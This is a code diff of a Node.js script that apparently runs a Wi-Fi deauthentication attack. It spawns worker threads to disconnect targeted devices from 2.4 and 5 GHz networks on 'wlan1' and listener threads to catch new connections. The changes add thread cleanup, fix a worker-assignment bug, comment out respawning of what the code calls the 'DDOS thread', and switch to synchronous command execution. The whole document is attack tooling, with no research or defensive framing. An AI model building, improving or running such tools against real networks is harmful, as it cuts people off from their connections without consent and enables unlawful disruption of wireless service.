@@ -1,15 +1,38 @@
 const { Worker } = require("worker_threads");
-const { exec } = require("child_process");
+const { execSync } = require("child_process");
 
 const INTERFACE = "wlan1";
 const parallelWorkers = {
     N2_4GHZ: null,
     N2_4GHZ_Listener: null,
     N5GHZ: null,
-    N5GHZ_Listener: null
+    N5GHZ_Listener: null,
+    COMMAND_5_GHZ: null,
+    COMMAND_2_4_GHZ: null
 };
 
-
+function stopAllThreads(){
+    /*
+        Stop the execusion of all threads
+    */
+    if (parallelWorkers.N2_4GHZ){
+        parallelWorkers.N2_4GHZ.terminate();
+        parallelWorkers.N2_4GHZ = null;
+    }
+    if (parallelWorkers.N2_4GHZ_Listener){
+        parallelWorkers.N2_4GHZ_Listener.terminate();
+        parallelWorkers.N2_4GHZ_Listener = null;
+    }
+    if (parallelWorkers.N5GHZ){
+        parallelWorkers.N5GHZ.terminate();
+        parallelWorkers.N5GHZ = null;
+    }
+    if (parallelWorkers.N5GHZ_Listener){
+        parallelWorkers.N5GHZ_Listener.terminate();
+        parallelWorkers.N5GHZ_Listener = null;
+    }
+    console.log("Parallel Workers: ", parallelWorkers);
+}
 
 function generateDeauthCMD(targets){
     // generates the deauth command to disconnect targets from 2.4 and 5 GHZ WI-FI
@@ -115,6 +138,7 @@ function runParallelDeuthLite(allDevices, networkData){
         type of network while we listen for new connections
     */
     
+   stopAllThreads();
     let targets = getTargets(allDevices);
     // no targets => do nothing
     if (targets.length < 1){
@@ -131,34 +155,35 @@ function runParallelDeuthLite(allDevices, networkData){
 
     // spawn 2.4 GHZ thread
     if (ATTACKING_2_4_GHZ_NETWORK){
-        // kill old thread if we need to respawn
-        if (parallelWorkers.N2_4GHZ && parallelWorkers.N2_4GHZ_Listener){
-            parallelWorkers.N2_4GHZ.terminate();
-            parallelWorkers.N2_4GHZ_Listener.terminate();
-        }
-        
         // spawn threads to listen for new connections and attack targets
         parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
             workerData: COMMAND_2_4_GHZ 
-        })
+        });
 
-        parallelWorkers.N2_4GHZ = new Worker("./deauthListener2_4.js", {
+        parallelWorkers.N2_4GHZ_Listener = new Worker("./deauthListener2_4.js", {
             workerData: LISTEN_COMMAND 
-        })
+        });
         
         parallelWorkers.N2_4GHZ.on("message", data => {
             console.log(data);
+        });
+        
+        // parallelWorkers.N2_4GHZ.on("error", err => {
+        //     console.log(`2.4 GHZ deuath worker errored with: \n${err} `);
+            
+        //     // respwan DDOS thread
+        //     parallelWorkers.N2_4GHZ.terminate();
+        //     parallelWorkers.N2_4GHZ = new Worker("./deauthWorker2_4.js", {
+        //         workerData: parallelWorkers.COMMAND_2_4_GHZ 
+        //     });
+        // });
+        parallelWorkers.N2_4GHZ_Listener.on("error", err => {
+            console.log(`2.4 GHZ listener worker errored with: \n${err} `);
         });
     }
     
     // spawn 5 GHZ thread
     else if (ATTACKING_5_GHZ_NETWORK){
-        // kill old thread if we need to respawn
-        if (parallelWorkers.N5GHZ && parallelWorkers.N5GHZ_Listener){
-            parallelWorkers.N5GHZ.terminate();
-            parallelWorkers.N5GHZ_Listener.terminate();
-        }
-        
         // spawn threads to listen for new connections and attack targets
         parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
             workerData: COMMAND_5_GHZ 
@@ -171,19 +196,31 @@ function runParallelDeuthLite(allDevices, networkData){
         parallelWorkers.N5GHZ.on("message", data => {
             console.log(data);
         });
+
+        // parallelWorkers.N5GHZ.on("error", err => {
+        //     console.log(`5 GHZ deuath worker errored with: \n${err} `);
+            
+        //     // respwan DDOS thread
+        //     parallelWorkers.N5GHZ.terminate();
+        //     parallelWorkers.N5GHZ = new Worker("./deauthWorker5.js", {
+        //         workerData: parallelWorkers.COMMAND_5_GHZ 
+        //     });
+
+        // });
+        parallelWorkers.N5GHZ_Listener.on("error", err => {
+            console.log(`5 GHZ listener worker errored with: \n${err} `);
+        });
     }
 }
 
-// depricate
-function executeCMD(command){
+function executeCMD(command, type){
     // executes a terminal command
-    exec(command, (err, stdout, stderr) => {
-        if (err) {
-            console.log(stderr)
-        } else {
-            console.log(stdout)
-        }
-    })
+    try {
+        stdOut = execSync(command);
+    } catch (err) {
+        console.log(`${type} errored with: \n${err}`);
+    }
+    // executeCMD(command, type);
 }
 
 
